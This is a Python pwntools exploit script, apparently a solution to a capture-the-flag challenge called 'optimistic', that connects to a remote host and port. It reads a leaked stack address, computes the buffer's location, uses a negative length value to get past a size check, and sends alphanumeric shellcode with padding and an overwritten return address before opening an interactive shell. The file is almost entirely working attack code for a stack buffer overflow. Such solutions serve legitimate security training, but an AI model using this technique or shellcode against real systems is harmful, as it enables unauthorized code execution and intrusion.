import pwn
from pwn import * 

#p = process('./optimistic')
p = remote('178.62.96.143',31017) #178.62.96.143:31017

ip = p.recv() #Initial line 
print(ip)

op1 = b'y'
p.sendline(op1)

ip2 = p.recv() #Here we are getting the address of the stack it seems
print(ip2)
ip_addr_str = ip2.decode()
ip_addr_str = ip_addr_str[38:50]
ip_addr_int = int(ip_addr_str,16) #The IP ADDRESS TO BE PUT IN THE BUFFER IS HERE
ip_addr_int -= 96 #This is the relative address of the buffer with the stack. So, when the function resets, the address we get is RBP. The buffer is the first local arg. So we have to subtract exactly the size of the buffer itself
print(hex(ip_addr_int))

email = b'test@test.com'
p.sendline(email)

ip3 = p.recv() # Age
print(ip3)
'''
age = b'4'
p.sendline(age)

ip4 = p.recv() #Length of name: STORED IN BSS
print(ip4)
'''
name_length = b'-2'
p.sendline(name_length)

ip5 = p.recv() #Actual name
print(ip5)

#name = b"A"*104 + b"BBBBBB"
payload = b"XXj0TYX45Pk13VX40473At1At1qu1qv1qwHcyt14yH34yhj5XVX1FK1FSH3FOPTj0X40PP4u4NZ4jWSEW18EF0V"
NOP_Sled = b"\x42"*(104-len(payload)) #since we have to use ascii I'm just throwing in a random char. Anyway, the shellcode has a ret in it so -\_ -_- _/-
ret_addr=p64(ip_addr_int)
name = payload + NOP_Sled + ret_addr
print(name)
p.sendline(name)

ip6 = p.recv()
print(ip6)

p.interactive()
#core = Coredump('./core')

